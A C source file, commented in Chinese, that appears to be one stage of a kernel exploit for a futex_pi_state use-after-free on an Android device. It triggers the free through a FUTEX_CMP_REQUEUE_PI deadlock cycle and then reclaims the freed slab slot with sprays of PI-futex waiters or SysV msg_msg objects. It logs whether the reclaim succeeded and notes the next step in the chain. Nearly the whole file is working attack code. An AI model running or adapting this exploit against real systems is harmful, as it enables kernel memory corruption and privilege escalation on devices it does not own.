/*
 * g3d_d2b.c — futex_pi_state UAF · D2''：同 cache 回收（修正 LOCK_PI 超时语义 + 亚毫秒窗口）
 *
 * 相对 d2 的三处关键修正（§21.21/§21.22）：
 *   1) 喷堆 waiter 改用 LOCK_PI(word, NULL)：本机 FUTEX_LOCK_PI 若传 monotonic 绝对时刻会
 *      **立即 ETIMEDOUT**（实测 0.0ms），导致"喷堆"微秒级就把 pi_state 释放掉 ⇒ d2 实际没占住任何对象。
 *   2) 喷堆 waiter 用 futex 门控（FUTEX_WAIT/WAKE），不空转抢 CPU；main 唤醒后只等 ~2ms。
 *   3) 全部线程绑 CPU0：kfree 发生在 main 的 futex_requeue 里，分配也要在同一 CPU 的 cpu-slab 上。
 *
 * 窗口：kfree(t≈[2]) → 走查(t≈[2]+2ms)，比 d2 的 1.1s 小三个数量级。
 * 判据（§21.23）：[5] 返回 0/1 且设备存活 = 回收成功；不返回/重启 = 未命中。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define LOGPATH "/data/local/tmp/g3d_d2b.log"
#define FUTEX_WAIT            0
#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG  128
#define MSPRAY 48

static int logfd = -1;
static double t0;

struct pair { uint32_t word; volatile int held; };

struct shared {
	uint32_t A, A2, B, C;
	uint32_t go;                        /* 喷堆门控 futex */
	volatile int w_holds_b, o_holds_c, o_blocked_b;
	volatile int w_waiting, w_ret, w_err, w_returned;
	volatile int w2_waiting, w2_ret, w2_err;
	struct pair spray[MSPRAY];
	volatile int go_spray;
	volatile int done;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap; int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.2fms] %s\n", now_ms() - t0, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	while (ts->tv_nsec >= 1000000000L) { ts->tv_sec += 1; ts->tv_nsec -= 1000000000L; }
}

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3)
{
	return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) { if (*p) return 1; usleep(2000); }
	return *p;
}

static void pin_cpu0(void)
{
	cpu_set_t set;
	CPU_ZERO(&set); CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		lg("sched_setaffinity 失败 errno=%d", errno);
}

static void *th_w(void *arg)
{
	struct timespec ts; long r;
	(void)arg;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno); return NULL;
	}
	S->w_holds_b = 1;
	abs_timeout(&ts, 3000);             /* 放宽：实验期间不要醒 */
	while (!S->o_blocked_b) __asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	S->w_ret = (int)r; S->w_err = errno; S->w_returned = 1;
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_o(void *arg)
{
	(void)arg;
	if (futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno); return NULL;
	}
	S->o_holds_c = 1;
	while (!S->w_holds_b) __asm__ __volatile__("" ::: "memory");
	S->o_blocked_b = 1;
	if (futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0)
		lg("O: LOCK_PI(B) 失败 errno=%d", errno);
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_w2(void *arg)
{
	struct timespec ts; long r;
	(void)arg;
	abs_timeout(&ts, 4000);
	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts, &S->C, 0);
	S->w2_ret = (int)r; S->w2_err = errno;
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *th_spray_hold(void *arg)
{
	struct pair *p = arg;
	if (futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
		p->held = -1; return NULL;
	}
	p->held = 1;
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* 关键：NULL 超时 ⇒ 永久阻塞 ⇒ pi_state 存活到进程退出 */
static void *th_spray_wait(void *arg)
{
	struct pair *p = arg;
	/* futex 门控睡眠（go 既是字值又是等待地址，避免丢唤醒） */
	while (!S->done) {
		if (S->go) break;
		(void)futex(&S->go, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	}
	if (S->done) return NULL;
	(void)futex(&p->word, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	while (!S->done) __asm__ __volatile__("" ::: "memory");
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t tw, to, tw2, sh[MSPRAY], sw[MSPRAY];
	int mode_trylock = (argc > 1 && argv[1][0] == 't');
	int mode_msgsnd  = (argc > 1 && argv[1][0] == 'm');
	long r, r5; int e, e5, i, held = 0;
	double t_free, t_walk;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	t0 = now_ms();
	lg("===== G3D-D2'' start pid=%d mode=%s =====", getpid(), mode_trylock ? "trylock-probe" : (mode_msgsnd ? "msg-spray" : "spray"));
	pin_cpu0();

	S = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 8192);

	/* [1] 建环 + 预置喷堆线程 */
	pthread_create(&tw, NULL, th_w, NULL);
	pthread_create(&to, NULL, th_o, NULL);
	pthread_create(&tw2, NULL, th_w2, NULL);
	for (i = 0; i < MSPRAY; i++) {
		pthread_create(&sh[i], NULL, th_spray_hold, &S->spray[i]);
		pthread_create(&sw[i], NULL, th_spray_wait, &S->spray[i]);
	}
	if (!wait_flag(&S->w_holds_b, 3000) || !wait_flag(&S->o_blocked_b, 3000) ||
	    !wait_flag(&S->w_waiting, 3000) || !wait_flag(&S->w2_waiting, 3000)) {
		lg("握手失败"); S->done = 1; _exit(2);
	}
	{	int spin = 0;
		while (spin < 400) {
			held = 0;
			for (i = 0; i < MSPRAY; i++) if (S->spray[i].held == 1) held++;
			if (held == MSPRAY) break;
			usleep(2000); spin++;
		}
	}
	usleep(100000);
	lg("[1] 环就绪；喷堆 holder 已持锁 %d/%d（waiter 停在 futex 门控上）", held, MSPRAY);

	/* [2] 触发 -EDEADLK：写 waiter->lock=C 并（在本进程内）释放 C 的 pi_state */
	lg("[2] 发 CMP_REQUEUE_PI(A→C,1)  —— 之后立即放行喷堆，中间不写日志");
	errno = 0;
	t_free = now_ms();
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	if (!(r == -1 && e == EDEADLK)) {
		lg("[2] 未命中 r=%ld errno=%d (%s)", r, e, strerror(e));
		S->done = 1; _exit(3);
	}

	if (mode_trylock) {
		/* 零风险直读探针：TRYLOCK_PI(C)。0=内核 owner 为空（pi_state 已释放）；
		 * -EAGAIN=owner 仍是 O（pi_state 未被释放）。 */
		long tr; int te;
		errno = 0;
		tr = futex(&S->C, 8 /* FUTEX_TRYLOCK_PI */ | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
		te = errno;
		lg("[T] FUTEX_TRYLOCK_PI(C) → %ld errno=%d (%s)", tr, te, strerror(te));
		lg(tr == 0 ? "[T] verdict: C 的**内核 owner 为空** ⇒ [2] 的 -EDEADLK 确实 proxy_unlock 并释放了 pi_state"
			   : (te == EAGAIN ? "[T] verdict: C 仍被持有（owner=O）⇒ pi_state **未被释放**，§21.11/§21.15 的机制需重判"
					   : "[T] verdict: 其他"));
		if (tr == 0) { (void)futex(&S->C, 7 /* UNLOCK_PI */ | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0); }
		lg("[T] C 字值=%u", S->C);
		S->done = 1; _exit(0);
	}

	/* [3m] 质量喷堆：SysV msg_msg（48B 头 + 80B 载荷 = 128B ⇒ kmalloc-128）
	 *      m_type = 0x100000000（低 32 位为 0）⇒ 命中时 wait_lock=0 放行、
	 *      waiters=m_ts=80 ⇒ 走到 rt_mutex_top_waiter/owner 即 oops（panic 自动重启，不卡死） */
	if (mode_msgsnd) {
		struct { long mtype; char mtext[80]; } mb;
		int q[10], i2, sent = 0, nq = 10, per = 200;
		mb.mtype = 0x100000000L;
		memset(mb.mtext, 0x41, sizeof(mb.mtext));
		for (i2 = 0; i2 < nq; i2++) q[i2] = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
		for (i2 = 0; i2 < nq * per; i2++) {
			if (q[i2 / per] < 0) continue;
			if (msgsnd(q[i2 / per], &mb, sizeof(mb.mtext), IPC_NOWAIT) == 0) sent++;
		}
		t_walk = now_ms();
		errno = 0;
		r5 = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
		e5 = errno;
		lg("[2] CMP_REQUEUE_PI(A→C)  → %ld errno=%d (%s)", r, e, strerror(e));
		lg("[3m] msgsnd 成功 %d 条（目标 2000）；free→walk 间隔 = %.3f ms", sent, t_walk - t_free);
		lg("[5] CMP_REQUEUE_PI(A2→C) → %ld errno=%d (%s)", r5, e5, strerror(e5));
		lg(r5 == -1 && e5 == EDEADLK
		   ? "verdict: 仍 -EDEADLK ⇒ 2000 次同 cache 分配都没拿到 ⇒ **对象没有被释放**"
		   : "verdict: 结果与 -EDEADLK 不同 ⇒ 槽被 msg_msg 占住 ⇒ **对象曾被释放**（详见返回码）");
		for (i2 = 0; i2 < nq; i2++) if (q[i2] >= 0) msgctl(q[i2], IPC_RMID, NULL);
		lg("结束");
		S->done = 1; _exit(0);
	}

	/* [3] 放行喷堆 → 等 2ms → 立即走查（此段禁止任何日志/syscall 分配） */
	S->go = 1;
	(void)futex(&S->go, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 0x7fffffff, NULL, NULL, 0);
	usleep(8000);
	t_walk = now_ms();
	errno = 0;
	r5 = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e5 = errno;

	/* [4] 事后记录 */
	lg("[2] CMP_REQUEUE_PI(A→C)  → %ld errno=%d (%s)", r, e, strerror(e));
	lg("[3] free→walk 间隔 = %.3f ms", t_walk - t_free);
	lg("[5] CMP_REQUEUE_PI(A2→C) → %ld errno=%d (%s)", r5, e5, strerror(e5));
	if (r5 >= 0) {
		lg("verdict: **回收成功** —— 旧 C 地址已被喷堆 pi_state 占住，走查安全落地（r=%ld）", r5);
		lg("        ⇒ UAF 可控复填成立；下一步 D3：让喷堆 holder 阻塞在我的锁上，延续链条");
	} else {
		lg("verdict: 返回错误 errno=%d，未回收但未崩溃（按 §21.23 转备选①）", e5);
	}
	S->done = 1;
	_exit(0);
}
